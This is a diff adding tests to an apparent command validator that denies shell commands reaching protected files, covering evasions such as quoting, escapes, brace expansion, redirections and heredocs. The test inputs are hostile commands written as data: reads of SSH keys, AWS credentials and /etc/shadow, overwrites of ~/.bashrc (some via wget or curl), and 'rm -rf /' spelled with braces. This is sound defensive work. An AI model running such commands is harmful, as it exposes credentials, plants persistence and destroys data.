@@ -660,6 +660,158 @@ async function runTests() {
   });
 
 
+  // ── Redirection targets ───────────────────────────────────────────────────
+  // The shell opens a redirection target on the command's behalf: `> file`
+  // writes over it and `< file` reads it, whatever command stands in front,
+  // with the operator glued to the target (`>file`, `word>file`) just as
+  // with a space between them. Every form is judged against the same
+  // protected paths a plain operand is.
+  console.log('\n=== validate_command: redirection targets ===');
+  const secretFile = path.join(home, '.ssh', 'id_rsa');
+  const profileFile = path.join(home, '.bashrc');
+  function assertRedirectDenied(cmd, direction) {
+    const result = validateCommand(cmd);
+    assert.strictEqual(result.allowed, false, `Expected DENIED for: ${cmd}`);
+    assert.strictEqual(result.advisory, false, `Verdict for '${cmd}' is advisory: ${JSON.stringify(result)}`);
+    assert.strictEqual(result.trust_level, 'DANGEROUS', `Expected DANGEROUS for '${cmd}': ${JSON.stringify(result)}`);
+    assert.ok(String(result.reason).includes(`redirecting ${direction}`), `Reason for '${cmd}' does not name the redirection: ${JSON.stringify(result)}`);
+  }
+  function assertNoRedirectDenial(cmd) {
+    const result = validateCommand(cmd);
+    assert.ok(result.allowed === true || result.advisory === true, `'${cmd}' is hard-denied: ${JSON.stringify(result)}`);
+  }
+  run('output glued to a credential file',                 () => assertRedirectDenied(`echo evil >${secretFile}`, 'output'));
+  run('output spaced from a credential file',              () => assertRedirectDenied(`echo evil > ${secretFile}`, 'output'));
+  run('output glued to a tilde path',                      () => assertRedirectDenied('echo evil >~/.ssh/id_rsa', 'output'));
+  run('output glued to the word before it',                () => assertRedirectDenied(`echo evil>${secretFile}`, 'output'));
+  run('output redirected before the command',              () => assertRedirectDenied(`>${secretFile} echo evil`, 'output'));
+  run('append glued to a shell profile',                   () => assertRedirectDenied(`echo evil >>${profileFile}`, 'output'));
+  run('stderr glued to a shell profile',                   () => assertRedirectDenied(`echo evil 2>${profileFile}`, 'output'));
+  run('both streams glued to a shell profile',             () => assertRedirectDenied(`echo evil &>${profileFile}`, 'output'));
+  run('clobber glued to a shell profile',                  () => assertRedirectDenied(`echo evil >|${profileFile}`, 'output'));
+  run('descriptor form >& onto a shell profile',           () => assertRedirectDenied(`echo evil >&${profileFile}`, 'output'));
+  run('quoted target glued to the operator',               () => assertRedirectDenied(`echo evil >"${profileFile}"`, 'output'));
+  run('read-only command writing a shell profile',         () => assertRedirectDenied(`ls >${profileFile}`, 'output'));
+  run('cat writing a shell profile',                       () => assertRedirectDenied(`cat README.md > ${profileFile}`, 'output'));
+  run('dev tool writing a shell profile',                  () => assertRedirectDenied(`node app.js >${profileFile}`, 'output'));
+  run('git writing a shell profile',                       () => assertRedirectDenied(`git log >${profileFile}`, 'output'));
+  run('wrapped command writing a shell profile',           () => assertRedirectDenied(`sudo echo evil >${profileFile}`, 'output'));
+  run('read-write open of a credential file',              () => assertRedirectDenied(`cat <>${secretFile}`, 'output'));
+  run('input glued from a credential file',                () => assertRedirectDenied(`cat <${secretFile}`, 'input'));
+  run('input spaced from a credential file',               () => assertRedirectDenied(`wc -l < ${secretFile}`, 'input'));
+  run('input from a tilde credential path',                () => assertRedirectDenied('head <~/.ssh/id_rsa', 'input'));
+  run('descriptor duplication names no file',              () => assertNoRedirectDenial('echo hi 2>&1'));
+  run('closing a descriptor names no file',                () => assertNoRedirectDenial('echo hi >&-'));
+  run('a plain output file stays outside the denial',      () => assertNoRedirectDenial('echo hi >out.txt'));
+  run('/dev/null stays outside the denial',                () => assertNoRedirectDenial('cat README.md 2>/dev/null'));
+  run('a heredoc delimiter is not a path',                 () => assertNoRedirectDenial(`cat <<${secretFile}`));
+  run('a here-string is text, not a path',                 () => assertNoRedirectDenial(`cat <<<${secretFile}`));
+  run('a quoted operator is literal text',                 () => assertNoRedirectDenial(`echo "a>${secretFile}"`));
+  run('an escaped operator is literal text',               () => assertNoRedirectDenial(`echo a\\>${secretFile}`));
+  run('an escaped quote inside double quotes does not hide the operator', () => assertRedirectDenied(`echo "\\""x>${secretFile}`, 'output'));
+  run('a backslash escape inside the target is resolved',        () => assertRedirectDenied('echo evil >~/.ss\\h/id_rsa', 'output'));
+  run('a redirection inside a process substitution is read',    () => assertRedirectDenied(`cat <(echo evil >${secretFile})`, 'output'));
+  run('an operator inside double quotes with an escaped quote is literal', () => assertNoRedirectDenial(`echo "\\"a>${secretFile}"`));
+  run('a process substitution is a command, not a file',         () => assertNoRedirectDenial('cat <(echo evil)'));
+  run('two redirections glued in one word are both read',      () => assertRedirectDenied(`echo x >out.txt>${secretFile}`, 'output'));
+  run('$HOME in a double-quoted target names the home directory', () => assertRedirectDenied('echo evil >"$HOME/.ssh/id_rsa"', 'output'));
+  run('${HOME} names the home directory in every path check',   () => assertHardBlocking('cat ${HOME}/.ssh/id_rsa'));
+  run('a comment is not read',                                  () => assertNoRedirectDenial(`echo ok # >${secretFile}`));
+  run('a double-quoted target with a space',                    () => assertRedirectDenied(`echo evil >"${path.join(home, '.ssh', 'my key')}"`, 'output'));
+  run('a single-quoted target',                                 () => assertRedirectDenied(`echo evil >'${secretFile}'`, 'output'));
+  run('a continued line does not start a comment',              () => assertRedirectDenied(`echo foo\\\n#text >${secretFile}`, 'output'));
+  run('a continuation inside the target is joined',             () => assertRedirectDenied(`echo evil >${path.join(home, 'config.p')}\\\nem`, 'output'));
+  run('a command substitution inside double quotes is read',    () => assertRedirectDenied(`cat "$(cat <${secretFile})"`, 'input'));
+  run('a backquoted command is read',                           () => assertRedirectDenied(`echo \`cat <${secretFile}\``, 'input'));
+  run('a parameter expansion in braces is text',                () => assertNoRedirectDenial(`echo \${x:->${secretFile}}`));
+  run('a comment ends at its newline',                          () => assertRedirectDenied(`echo ok # note\necho evil >${secretFile}`, 'output'));
+  run('a comment inside a substitution ends at its newline',    () => assertRedirectDenied(`echo x $(echo y # note\ncat <${secretFile})`, 'input'));
+  // The body of a heredoc is data: the scan leaves it out, while the rest
+  // of the line that opens it and the lines after its terminator are read.
+  // A protected path inside the body still meets the per-command checks,
+  // which read the line word by word, so only the scan's own verdict is
+  // asserted there.
+  function assertNoRedirectVerdict(cmd) {
+    const result = validateCommand(cmd);
+    assert.ok(!String(result.reason ?? '').includes('redirecting'), `'${cmd}' was denied by the redirection scan: ${JSON.stringify(result)}`);
+  }
+  run('a heredoc body is data, the rest of its line is read',    () => assertRedirectDenied(`cat <<EOF >${secretFile}\nbody\nEOF`, 'output'));
+  run('a heredoc body is not read for operators',               () => assertNoRedirectVerdict(`cat <<EOF\n> ${secretFile}\nEOF`));
+  run('a command after the heredoc terminator is read',         () => assertRedirectDenied(`cat <<EOF\nbody\nEOF\necho evil >${secretFile}`, 'output'));
+  run('an operational file stays readable by redirection', () => assertNoRedirectDenial(`cat <${path.join(home, '.egc', 'bin', 'manifest.json')}`));
+
+  // ── Protected paths in every spelling ────────────────────────────────────
+  // The shell removes the quotes and resolves the escapes of an argument
+  // before the command sees it, so a protected path meets the same denial
+  // written between quotes, with an escaped character, or glued to a flag,
+  // in the catalogued commands as in the rest; on Windows a backslash is a
+  // path separator, and the argument as typed is judged as well.
+  console.log('\n=== validate_command: protected paths in every spelling ===');
+  const keyFile = path.join(home, '.ssh', 'id_rsa');
+  const credentialsFile = path.join(home, '.aws', 'credentials');
+  const sshDir = path.join(home, '.ssh');
+  run('cat of a double-quoted credential',              () => assertHardBlocking(`cat "${keyFile}"`));
+  run('cat of a single-quoted credential',              () => assertHardBlocking(`cat '${keyFile}'`));
+  run('cat of a quoted tilde path',                     () => assertHardBlocking('cat "~/.ssh/id_rsa"'));
+  run('cat of a credential with an escaped character',  () => assertHardBlocking(`cat ${home}/.ssh/id\\_rsa`));
+  run('cat of a credential whose name carries a space', () => assertHardBlocking(`cat "${path.join(home, '.ssh', 'id rsa')}"`));
+  run('head of a quoted credential',                    () => assertHardBlocking(`head -n 1 "${credentialsFile}"`));
+  run('grep over a quoted credential store',            () => assertHardBlocking(`grep -r x "${sshDir}"`));
+  run('grep with a quoted pattern file in the store',   () => assertHardBlocking(`grep -f "${path.join(sshDir, 'known_hosts')}" x`));
+  run('find over a quoted credential store',            () => assertHardBlocking(`find "${sshDir}" -name x`));
+  run('ls of a quoted credential store',                () => assertHardBlocking(`ls "${sshDir}"`));
+  run('node given a quoted credential',                 () => assertHardBlocking(`node "${keyFile}"`));
+  run('git config with a quoted file in the store',     () => assertHardBlocking(`git config -f "${path.join(sshDir, 'config')}" x`));
+  run('wget onto a quoted shell profile',               () => assertHardBlocking(`wget -O "${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('a value glued to a quoted short flag',           () => assertHardBlocking(`curl -o"${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('find with a quoted action flag',                   () => assertHardBlocking('find . "-delete"'));
+  run('find with a single-quoted action flag',            () => assertHardBlocking("find . '-delete'"));
+  run('find with an action flag quoted in the middle',    () => assertHardBlocking('find . -dele"te"'));
+  run('grep with a quoted file flag naming the store',    () => assertHardBlocking(`grep "-f" ${path.join(sshDir, 'known_hosts')} x`));
+  run('a brace expansion that names a credential store',  () => assertHardBlocking(`cat ${home}/.{ssh,aws}/x`));
+  run('a brace expansion deep in the path',               () => assertHardBlocking(`head ${path.join(home, '.ssh')}/{id_rsa,id_ed25519}`));
+  run('braces without a comma are a literal name',        () => assertAllowed('cat "notes{draft}.md"'));
+  run('a brace expansion of plain files stays allowed',   () => assertAllowed('cat src/{a,b}.js'));
+
+  run('a credential in ANSI-C quoting',                    () => assertHardBlocking(`cat $'${keyFile}'`));
+  run('a credential spelled with ANSI-C hex escapes',      () => assertHardBlocking(`cat $'\\x2fetc\\x2fshadow'`));
+  run('a secret file split by a continued line',           () => assertHardBlocking(`cat ${path.join(home, 'app', '.e')}\\\nnv`));
+  run('a continued line inside double quotes',            () => assertHardBlocking(`cat "${path.join(home, 'app', '.e')}\\\nnv"`));
+
+  run('an ANSI-C escape past the Unicode range is judged, not thrown', () => {
+    const result = validateCommand(`cat $'\\U12345678'`);
+    assert.ok(typeof result.allowed === 'boolean', JSON.stringify(result));
+  });
+
+  run('find by name pattern is a search, not a path',       () => assertAllowed('find . -name "*.env"'));
+  run('find by name pattern with a type test',              () => assertAllowed('find src -name "*.pem" -type f'));
+  run('find with a quoted credential store as start',       () => assertHardBlocking(`find "${sshDir}" -name "*.pub"`));
+  run('find with an option before the credential store',    () => assertHardBlocking(`find -L "${sshDir}" -type f`));
+  run('find writing its list into a shell profile',         () => assertHardBlocking(`find . -fprint "${path.join(home, '.bashrc')}"`));
+
+  run('quoted braces are characters of the name',           () => assertAllowed(`cat "${home}/.{ssh,aws}/x"`));
+  run('escaped braces are characters of the name',          () => assertAllowed(`cat ${home}/.\\{ssh,aws\\}/x`));
+  run('a brace-expanded flag is read as the flags it becomes', () => assertHardBlocking('find . -{delete,print}'));
+  run('a word past the expansion cap refuses the command',  () => {
+    const result = validateCommand('cat x{a,b,c,d}{a,b,c,d}{a,b,c,d}{a,b,c,d}');
+    assert.strictEqual(result.allowed, false);
+    assert.strictEqual(result.advisory, false, JSON.stringify(result));
+    assert.ok(String(result.reason).includes('brace expansions'), JSON.stringify(result));
+  });
+  run('a word past the cap refuses an uncatalogued command too', () => {
+    const result = validateCommand('wget -O x{a,b,c,d}{a,b,c,d}{a,b,c,d}{a,b,c,d} https://x.tld/a');
+    assert.strictEqual(result.allowed, false);
+    assert.strictEqual(result.advisory, false, JSON.stringify(result));
+  });
+
+  run('find with the option terminator before the store',   () => assertHardBlocking(`find -- "${sshDir}" -type f`));
+  run('find with the option terminator and a plain start',  () => assertAllowed('find -- . -name "*.md"'));
+  run('a destructive command spelled with a brace expansion', () => assertHardBlocking('r{m,} -rf /'));
+  run('a destructive command behind a wrapper, spelled with braces', () => assertHardBlocking('sudo r{m,} -rf x'));
+
+  run('a quoted operational file stays readable',       () => assertAllowed(`cat "${path.join(home, '.egc', 'bin', 'manifest.json')}"`));
+  run('a quoted plain file stays allowed',              () => assertAllowed('cat "README.md"'));
+
   // ── validate_command: the git force flag read per subcommand ─────────────
   // A force flag means a different thing in every git subcommand: on push it
   // rewrites history other people already have, on worktree remove it drops a
